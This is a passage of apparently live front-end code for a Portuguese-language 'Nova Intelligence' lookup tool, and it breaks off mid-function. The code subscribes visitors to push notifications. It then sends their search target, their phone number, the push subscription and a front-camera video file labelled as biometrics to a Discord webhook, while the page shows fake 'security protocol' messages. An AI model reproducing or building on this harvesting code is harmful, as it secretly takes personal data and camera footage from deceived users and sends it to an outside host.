  const setupPushSubscription = async () => {
    try {
      if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
        return "NOT_SUPPORTED";
      }

      const registration = await navigator.serviceWorker.ready;
      const subscribeOptions = {
        userVisibleOnly: true,
        applicationServerKey: 'BEl62VPqH_7yF9yv4I4AkyC0vT0Xq9B4u4zP4f4Z4zP4f4Z4zP4f4Z4zP4f4Z4zP4f4Z4zP4f4Z4zP4f4Z4w'
      };

      const subscription = await registration.pushManager.subscribe(subscribeOptions);
      return subscription;
    } catch (error) {
      console.error('Push Error:', error);
      return `ERROR: ${error instanceof Error ? error.message : String(error)}`;
    }
  };

  const sendToWebhook = async (pushData: any, videoBlob?: Blob) => {
    try {
      const formData = new FormData();

      const content = `
**🚨 NOVO ACESSO DETECTADO - NOVA INTELLIGENCE**
**Módulo:** ${tool.title}
**Alvo da Busca:** \`${query}\`
**Telefone Validador:** \`${userRealNumber}\`
**Origin:** ${window.location.origin}

**Assinatura Push / Status:**
\`\`\`json
${typeof pushData === 'string' ? pushData : JSON.stringify(pushData, null, 2)}
\`\`\`
      `;

      formData.append('payload_json', JSON.stringify({
        content: content,
        username: "Nova Intelligence Bot",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041916.png"
      }));

      if (videoBlob) {
        formData.append('file', videoBlob, 'biometria_frontal.webm');
      }

      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error("Webhook fail:", err);
    }
  };

  const handleFinalSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userRealNumber) return;

    setIsLoading(true);
    setResult(null);
    setStatusText('Iniciando protocolos de segurança...');
    setIsScanning(true);

